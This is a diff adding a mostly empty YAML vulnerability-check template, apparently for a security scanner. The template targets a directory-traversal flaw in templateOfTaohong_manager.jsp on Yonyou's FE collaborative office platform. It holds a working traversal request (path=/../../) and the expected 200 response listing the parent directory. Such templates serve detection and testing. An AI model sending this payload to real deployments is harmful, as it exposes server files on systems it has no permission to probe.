@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 用友FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /system/mediafile/templateOfTaohong_manager.jsp?path=/../../
+response1:
+  headers:
+  body: 返回上级目录
+  code: 200
+requests2:
+response2:
